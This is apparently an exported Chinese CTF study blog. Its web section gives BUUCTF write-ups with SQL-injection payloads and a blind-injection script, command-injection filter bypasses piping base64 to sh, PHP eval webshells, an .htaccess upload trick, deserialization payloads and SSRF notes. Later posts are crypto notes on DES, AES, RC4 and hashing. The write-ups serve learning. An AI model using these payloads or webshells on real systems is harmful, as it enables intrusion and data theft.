$page的值为hint.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。 SQL注入常规流程使用hackbar1.判断是字符型还是数字型 1&#x27;or 1=1 # 如果是整形，他的报错信息应为“ ’ “ 那我们需要闭合，由于这个题目没有过滤任何sql注入的关键字，我们直接用 %23（#）来进行闭合sql语句 2.爆列数 1?username=1&amp;password=11&#x27; order by 3%23 一般为3时有回显，字段数为3 3.爆库 1?username&#x3D;1&amp;password&#x3D;11&#39; union select 1,version(),database()%23 4.爆表名 1?username=123&amp;password=111&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 5.爆表 123?username=1&amp;&amp;password=1&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #或?username=1&amp;&amp;password=1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from l0ve1ysq1%23 ps:功能函数1.concat_ws()函数 功能：一次性指定分隔符 语法：concat_ws(separator,str1,str2,…) 说明：第一个参数指定分隔符 分隔符不能为空 如果为NULL 则返回值NULL 2.concat()函数 功能：将多个字符串拼接成一个字符串 语法：concat(str1,str2,…) 返回结果为连接参数产生的字符串 如果有任何一个参数为NULL 则返回值NULL 3.group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] ) 即按需求打印内容 BUUCTF HardSQL一个字符一个字符试发现很多字符如and,union都被过滤因为空格被过滤，用()分割语句达到代替空格的效果。=被过滤，可以用like替代。尝试用updatexml报错注入 1check.php?username=1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=2 爆出库名 爆表名 1check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password&#x3D;2 爆列名 1check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;2 因为updataxml限制语句为32位，而flag长度大于32位，所以用left和right函数拼接 1234前半部分 check.php?username=1&#x27;or(updatexml(1,concat(0x7e,(select((left(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2后半部分 ![check.php?username=1&#x27;or(updatexml(1,concat(0x7e,(select((right(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2](https://img-blog.csdnimg.cn/20210405154340430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70) 参考文章：【extractvalue报错注入】https://blog.csdn.net/qin9800/article/details/113446035 堆叠注入在SQL中，分号（;）是用来表示一条sql语句的结束。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 1’;desc 1919810931114514; 知识点1：堆叠注入在SQL中，分号是用来表示一条sql语句的结束。如果在 ; 结束一个sql语句后继续构造下一条语句，效果就是分别执行两条sql语句。由于两条语句堆叠在同一行，而不是原本应该各自占据一行，所以这种注入成为堆叠注入。 知识点2当数字型字符作为字段、表、库名查询时，应该用反单引号括起来 mysql预处理语句 123PREPARE sqla from &#x27;[my sql sequece]&#x27;; 预定义SQL语句EXECUTE sqla; 执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句 通过变量进行传递SET @tn = ‘flag’; 存储表名SET @sql = concat(‘select * from ‘, @tn); 存储SQL语句PREPARE sqla from @sql; 预定义SQL语句EXECUTE sqla; 执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句 PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。 使用MD5函数实现sql注入BUUCTF easy MD51.知识点：（1）MD5函数在加密ffifdyop后返回原始字符串’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c ，另外mysql中以数字开头的字符串会被当做整形处理例如‘6abc’=6。（2）md5绕过：因为md5不能处理数组，会返回NULL，因为NULL=NULL，可以实现绕过，传入数组，使得 md5 处理两个参数都返回 0 即可： payload:?a[]=1&amp;b[]=2或者传入两个md5处理后以0e开头的字符串 1234567下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387a 2.解题随便输入后抓包发现Hint中有提示利用md5特性传入ffifdyop，使得select语句为： 1select * from &#x27;admin&#x27; where password=&#x27; &#x27;or &#x27;6&#x27; 这样就相当于sql语句为永真实现注入得到访问页面发现了php页面利用md5绕过得到访问页面同样为一个md5绕过的php页面，易得flag 例题BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP） 题目描述: 已知表名和列名，并且发现过滤了很多sql字符，尝试注入 11^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)^1 奉上大佬脚本 123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php&quot;temp = &#123;&quot;id&quot; : &quot;&quot;&#125;flag = &quot;&quot;for i in range(1,1000): time.sleep(0.06) low = 32 high =128 mid = (low+high)//2 while(low&lt;high): temp[&quot;id&quot;] = &quot;1^&quot; + &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot; %(i,mid) r = requests.post(url,data=temp) print(low,high,mid,&quot;:&quot;) if &quot;Hello&quot; in r.text: low = mid+1 else: high = mid mid =(low+high)//2 if(mid ==32 or mid ==127): break flag +=chr(mid) print(flag)print(&quot;flag=&quot; ,flag) 请看这位师傅的题解sql字典 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960selectfromasciisubstrtablecolumnbyschemawhereextractvalueexpif/()%!@#$^&amp;*-_+=&#x27;&quot;~`\\|,.||&amp;&amp;orderupdatexmllimitAndOr%23 &lt;&gt;regexgroup_concattable_nametable_schemacolumn_namedatabaseimformationunion selectascii(substr())(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())(ascii(substr((select(group_concat(flaaag))from(flag)),%s,1))=%s)where(table_schema=database()) 补充：使用burp进行Fuzz测试实现SQL注入，burp的Intruder模块 [GYCTF2020]Blacklist [堆叠注入] 尝试堆叠注入 爆列名 HANDLER方法引自大佬：HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭构造： 11&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# 参考文章 Ping命令常用管道符命令 123456789&amp; （按位与） 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp;&amp;&amp; （逻辑与）表示前一条命令执行成功时，才执行后一条命令 ，如果前面为假，后面的命令也不执行 如 echo &#x27;1‘ &amp;&amp; echo ‘2’| （按位或）表示管道，上一条命令的输出，作为下一条命令参数，直接执行|后面的语句，如 echo ‘yes’ | wc -l|| （逻辑或）表示上一条命令执行失败后，才执行下一条命令，否则只执行前面的语句，如 cat nofile || echo “fail”; 分号表示命令依次执行。 1.过滤问题：空格 1234567&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txtkg=$&#x27;\\x20flag.txt&#x27;&amp;&amp;cat$kg(\\x20转换成字符串就是空格，这里通过变量的方式绕过) 1)变量拼接字符串 1234b=ag.php;a=fl;cat$IFS$9$a$b //为什么要反过来？flag匹配时中间有内容也会被匹配。//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配 2)base编码绕过base64 编码的方式来绕过 flag 过滤 1234567加密命令echo “cat flag.php” | base64解密命令并执行echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh然后用$IFS$9代替空格。构造payload ?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh 3)内联执行linux中反引号作为内联使用 1cat `ls` nc 在linux中nc 后返回网页源码html tornadoBUUCTF tornado题解tornado存在模版SSTI注入漏洞，尝试通过此漏洞获取到所需内容1.先访问报错网页 1/error?msg=Error 2.通过handler.settings对象获取cookie_secret的值，即：handler指向RequestHandlerRequestHandler.settings指向self.application.settings所以handler.settings最终指向RequestHandler.application.settings构造如下： 1/error?msg=&#123;&#123;handler.settings&#125;&#125; 3.md5只加密二进制，所以先encode(‘utf-8’)编码为二进制,对于函数hash.digest()返回摘要，作为二进制数据字符串值hash.hexdigest()返回摘要，作为十六进制数据字符串值进而根据题目已知信息编写脚本，获取payload 文件上传解法(1) 带图片头的php一句话木马 12GIF89a?&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;v&#x27;]);&lt;/script&gt; (2) 可解析的php后缀名：php3，php4，php5，pht，phtml,phps注：菜刀连接是要用POST注意MMIE类型为jpeg，因为只允许图片上传Content-Type: image/jpeg绕过过程：1.新建txt文件编写一句话木马，后缀为jpg（还有gif png等格式视情况而定）注意MMIE类型为jpeg，因为只允许图片上传Content-Type: image/jpeg2.Burpsuite抓包改包，修改文件后缀名，直至上传成功，如BUUCTF upload中只有php后缀名为phtml才可以3.上传成功后用蚁剑连接最终在根目录可找到flag [MRCTF]你传你🐎呢1.htaccess文件 1234567.htaccess文件(或者&quot;分布式配置文件&quot;）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 2.上传.htaccess文件，注意文件名必须相同才能够被上传成功 123&lt;FilesMatch &quot;webshell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 3.上传一句话木马webshell.jpg 123&lt;?php@eval($_POST[&#x27;v&#x27;]);?&gt; 4.用蚁剑连接获得flag HTTP请求头Referer:http://xxxxx修改访问浏览器：在User-Agent中修改在本地访问：X-Forwarded-For:127.0.0.1 PHP序列化和反序列化1234（2021.3.24）最近做到php序列化的题看了好多师傅们的博客学到了很多Y4师傅博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;solitudi&#x2F;article&#x2F;details&#x2F;113588692?spm&#x3D;1001.2014.3001.5502这里就打算简单总结一下，以备之后复习 1.protected ,private,public属性var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \\0*\\0 的前缀，注意，这里的 \\0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 。 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \\0\\0 的前缀，这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。在进行长度计算的时候，会把 \\0 也计算上 1234567891011121314151617181920212223242526272829 再序列化内容中用大写S表示字符串，此时字符串就支持后面的字符串用16进制表示- ### buu NiZhuanSiWei题目给出源码：&#96;&#96;&#96;javascript&lt;?php $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;&#x2F;&#x2F;file_get_contents()函数的功能是读取文件内容到一个字符串 echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;; if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); &#x2F;&#x2F;useless.php $password &#x3D; unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1.使用data伪协议和文件包含： 1?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 用php://input伪协议在以POST形式传入“ welcome to the zjctf “ 也可以用data伪协议传参 123456789101112131415161718/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php````2.得到base64编码的页面，解密如下：```java&lt;?php class Flag&#123; //flag.php （题目源码注释） public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); //输出文件内容,通过这个函数读取flag echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 3.反序列化：4.重新构造payload 1?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 5.最后查看源码得到flag BUUCTF [网鼎杯 2020 青龙组]AreUSerialz 知识点：php反序列化漏洞，弱类型比较 打开地址看到123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 需要绕过两个地方 1.绕过is_valid(),protected属性方法：用大写S表示字符串，在php7.1+的环境下对属性的要求不是很敏感,用public属性绕过private属性产生的%00问题 2.弱类型绕过__destruct()魔术方法中，op===”2”是强比较（类型和属性都等于’2’），而process()使用的是弱比较op==”2”，可以通过弱类型绕过方法：op=2，这时op===”2”为false,op==”2”为true 1234567private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; 对于file_get_contents()函数，可以用php:filter伪协议读取，将filename置为```php://filter/read=convert.base64-encode/resource=flag.php``。 123456789&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;//或者直接读&#x27;flag.php&#x27; public $content;&#125;echo serialize(new FileHandler);?&gt;//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; payload为 1?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; 得到flag{12ffa359-defc-4dc6-b363-0b6f48c79b91} SSRF 1.介绍SSRF 参考文章 SSRF简介 SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。 由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。 SSRF形成原因 大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。 最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF漏洞。 SSRF与CSRF的区别 CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器； SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。 SSRF的类型 1）显示对攻击者的响应（basic）：在服务器获取攻击者要求的URL后，把响应发送回攻击者。 2）不显示响应（blind）：在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。 利用SSRF可以实现的攻击 1）获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透； 2）攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）； 3）利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。 拓展攻击面 结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。","categories":[],"tags":[]},{"title":"","slug":"[现代密码学] Crypto 知识点总结（古典密码&&对称加密&&hash函数）","date":"2021-05-08T11:05:24.607Z","updated":"2021-05-08T11:04:04.486Z","comments":true,"path":"undefined/[现代密码学] Crypto 知识点总结（古典密码&&对称加密&&hash函数）.html","link":"","permalink":"http://k4oer.gitee.io/undefined/[%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6]%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&&%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&&hash%E5%87%BD%E6%95%B0%EF%BC%89.html","excerpt":"","text":"@TOC 一 . 常见加解密SM1-4国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。 SM1 为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。 SM2为非对称加密，基于ECC。该算法已公开。由于该算法基于ECC，故其签名速度与秘钥生成速度都快于RSA。ECC 256位（SM2采用的就是ECC 256位的一种）安全强度比RSA 2048位高，但运算速度快于RSA。 SM3 消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。 SM4 无线局域网标准的分组数据算法。对称加密，密钥长度和分组长度均为128位。 二. 古典密码代换密码 分类： 移位（凯撒）密码 仿射密码 单表代换 多表代换 置换密码 Hill密码 转轮密码恩格码机 代换密码的唯密文攻击 1.统计攻击 2.重合指数法例题 密码分析可分为那几类，它们的含义是什么？根据密码分析者可能取得的分析资料的不同，密码分析（或称攻击）可分为下列四类：1）唯密文分析（攻击），密码分析者取得一个或多个用同一密钥加密的密文；2）已知明文分析（攻击），除要破译的密文外，密码分析者还取得一些用同一密钥加密的明密文对；3）选择明文分析（攻击），密码分析者可取得他所选择的任何明文所对应的密文（当然不包括他要恢复的明文），这些明密文对和要破译的密文是用同一密钥加密的；4）选择密文分析（攻击），密码分析者可取得他所选择的任何密文所对应的明文（要破译的密文除外），这些密文和明文和要破译的密文是用同一解密密钥解密的，它主要应用于公钥密码体制。 移位密码，仿射密码，单表代换密码都没有破坏明文的频率统计规律，可以直接用统计分析法 字母频率分析法对（单表代换密码）算法最有效例题 三. 对称加密算法12引自合天网安实验室：https:&#x2F;&#x2F;www.hetianlab.com&#x2F;expc.do?ce&#x3D;7bbc91e0-a9b3-4af9-a108-ce94117ee430以及现代密码学（谷利泽版） 分组密码设计思想： 混淆：明文/密钥和密文之间的关系复杂 分组：明文/密钥的每一个比特都影响密文的每一个比特DES算法（数据加密标准）1. Feistel结构明文和密文分组长度为64Bit，密钥长度56bit（密钥空间2^56）算法包括：迭代加密和密钥编排 IP置换（初始置换）根据初始置换表，将明文数据移到该数据所在位置从上表我们可以总结出，初始置换表的规律其实就是（其实不用太在意这个规律）：a. 偶数与奇数分开（1~64），然后分为上下两部分，分布在置换表中，偶数在上，奇数在下。 b. 在偶数与奇数内部，又遵从“从右到左，从上到下，从小到大”的排列。 实际中加密的是二进制数据，为直观展示这里用字母代替置换完至此我们便得到了初始置换之后的数据 Data=“5XPHzrjb7ZRJBtld91TLDvnf=3VNFxph4WOGyqia6YQI(i)Askc80SKCume+2UMEwog” L0 = “5XPHzrjb7ZRJBtld91TLDvnf=3VNFxph” R0 = “4WOGyqia6YQI(i)Askc80SKCume+2UMEwog” 2. 轮函数函数 f主要对数据右半部分R进行操作 a. 先对其进行扩展置换，使其变为48位的数据， b. 然后生成的数据再与子密钥进行异或运算， c. 再以异或运算后的48位数据进行S盒代替，将48位的数据，转换为32位的数据， d. 再进行P盒置换，生成32位的数据 e. 最后将P盒置换生成的数据与本轮运算的L进行异或，生成新的R。 f. 而新的L是直接由本轮的R进行替换 3. 密钥编排算法 子密钥K的生成假设初始64位密钥：“abcdefgh ijklmnop qrstuvwx yzABCDEF GHIJKLMN OPQRSTUV WXYZ0123 456789+=”红色部分为奇偶校验位，不参与加密算法 初始压缩置换后：可以看出压缩置换1的规律： 压缩置换1接下来的是拆分： K0=“4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ+2UMEwog91TLDvnf80SKCumeBtld” C0=“4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ” D0=“+2UMEwog91TLDvnf80SKCumeBtld” 拆分之后我们得到C0、D0，再然后就是循环左移，求出C1、D1： 根据”轮数和左移位数”的对应表，第一轮得到 123C1&#x3D;“WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ4”D1&#x3D;“2UMEwog91TLDvnf80SKCumeBtld+” 如上，左移的同时还要保持位数不变，所以移动的数据又补充到后面。 C1D1= “WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ42UMEwog91TLDvnf80SKCumeBtld+” 压缩置换2 得到子密钥K1K1=“jYH7WqG4bisPcI(i)zyR56aJArOvBM1KdUDe0wC8uL+otSnm92E” 扩展置换E将数据R（32位），按照每4位一组，拆分成8个组，如图，左右黑色的两列是扩展时添加的数据，中间的就是分组后的数据R，表中的数字代表数据R中的位置。分成8组织后，遵循这样的一个规则：每一组的头部添加本组数据上一组的尾部，每一组的尾部添加本组数据下一组的头部。即第一组数据，前面添加的是最后一组的最后一位数据，后面添加的是第二组的第一位数据…以此类推因此，对R0进行扩展置换R0=“4WOGyqia6YQI(i)Askc80SKCume+2UMEwog”之后我们便得到了扩展到48位的R0： R0=“g4WOGYGYqia6a6YQI(i)AI(i)Askc8c80SKCKCume+e+2UMEMEwog4” 扩展置换E结束之后，我们要进行的就是K1与R0的异或运算 S盒代替S盒代替的作用，就是将我们上一步，R0与K1异或后得到的48位数据压缩为32位数据。 我们前面扩展置换后得到的R0是48位的数据，我们的S盒有8个，那么我们就需要将得到的R0平均分为8组，每组对应一个S盒。每一组的数据长度为6位，假设第一组的二进制数据为：“100110”那么，我们取第一位与最后一位，组成行数：“10”=2取中间四位，组成列数：“0011”=3那么，在对应的S1盒中，取2行3列的数据（第3行第4列）：8，转换为2进制：“1000”那么就将这个得到的4位二进制数据，代替原来第一组的6位数据，这样一来，等8个S盒全部代替完毕，我们就得到32位的数据。 P盒置换至此我们便得到了f(R0,K1),只要再与L0进行异或运算，就得到了第一轮运算最终的R1，然后再将R0的值赋给L1，就完成了第一轮的运算，得到了L1,R1。 4. 末置换 经过16次的运算，我们在函数f的最后，会得到“L16、R16”，这正是我们需要的，然后将L16与R16合并，但是与之前的步骤中的合并不同，此次合并需要先交换二者的位置，也就是应该是R16 L16。 5. 安全增强（1）穷举搜索攻击目标：给定输入输出对 (m i , c i = E(k, m i )) i=1,..,3 ，寻找密钥 k.（2）3DES 1234令 E : K × M -&gt; M 是一个分组密码定义 3E: K^3 × M -&gt;M 为 3E ( (k 1 ,k 2 ,k 3 ), m ) &#x3D;E(k 3 ,E (k 2 , E(k 1 , m)))密钥长度 &#x3D; 3 × 56 &#x3D; 168 bits ( 穷举攻击复杂度≈2 ^118) 参考文章: DES 安全性&amp;3DES , 三重DES原理 AES算法（高级加密标准）对称加密流程分组加密算法：明文（128/256bit)和密文分组（128/192/256bit)可变长度SPN结构：轮函数包括：代换层-置换层-密钥混合层密钥长度：128bit（密钥空间2^128) 10轮 包含4个步骤 字节代替 字节代替（SubBytes）的目的是通过S盒完成一个字节到另外一个字节的映射转换，字节替换为这个密码系统提供了替换性。 行移位行移位（ShiftRows）步骤过程中，每一行都向左循环位移某个偏移量。在AES中（区块大小128位），第一行维持不变，第二行里的每个字节都向左循环移动一格，第三行里的每个字节都向左循环移动二格，第四行里的每个字节都向左循环移动三格。经过行移位之后，矩阵中每一竖列，都是由输入矩阵中的每个不同列中的元素组成。 列混淆这里有一个错误，初始矩阵为，另外列混淆中第二项02·6E=11011100有限域上的字节运算： 轮密钥加 AES的密钥编排算法 密钥扩展：AES的解密变换 分组密码的运行模式1. ECB模式 2. CBC模式 3. CFB模式反馈是指前一个密文分组的值会被送到密码算法的输入端。在ECB模式和CBC模式中，明文分组都是通过密码算法进行加密的，然而，在CFB模式中，明文分组并没有通过密码算法来直接进行加密。 明文分组和密文分组之间并没有经过“加密”这一步骤。（加解密过程只调用加密算法这一个过程）在CFB模式中，明文分组和密文分组之间只有一个XOR。j通常为8 参考文章：CFB原理 4. CTR模式（计数器） 例题 1977年1月 DES正式成为美国联邦政府信息处理标准，即FIPS-46标准，1997年撤销，采用AES算法，新算法的分组长度为128比特，支持可变密钥长度128，192，256比特。1999年最终选定Rijndanel算法为新的数据加密标准。 WAPI标准是中国颁布的无线局域网安全国家标准 流密码流密码核心：伪随机数生成器（PRG） LFSR ：线性反馈移位寄存器（为线性函数）密钥流{k}的周期一定要大 例题： RC4算法（序列密码） KSA 123456789//S 表随机化s[i] 数据t[i] 密钥j = 0i = 0for i in range(n): j = (j+s[i]+t[i])%n; s[i],s[j]=s[j],s[i]; PRGA(伪随机数生成算法）12345i = (i+1)%nj = (j+s[i])%nswap(s[i],s[j])t = (s[i]+s[j])%nk = s[t] RC4应用 例题13. 一般的，一个反馈移位寄存器由两部分组成：移位寄存器和反馈函数 四. Hash函数SHA-256算法 例题hash函数的抗二次原像性：对于给定的消息M1，发现另一个消息M2，使得H(M1)=H(M2)在计算上是不可行的。抗碰撞性：找到任意一对不同的M1和M2，使得H（M1）=H（M2）在计算上是不可行的。","categories":[],"tags":[]},{"title":"DES算法逆向分析","slug":"DES算法逆向分析","date":"2021-05-04T16:00:00.000Z","updated":"2021-05-05T13:09:25.576Z","comments":true,"path":"undefined/DES算法逆向分析.html","link":"","permalink":"http://k4oer.gitee.io/undefined/DES%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html","excerpt":"","text":"DES算法逆向分析前言：了解DES算法的基本流程： 一. 用IDA打开，得到汇编代码 二. 逐层分析1. 整体初始化 rep stosd之前为栈的初始化，为程序分配栈空间 123456mov eax, ds:dword_428458 mov 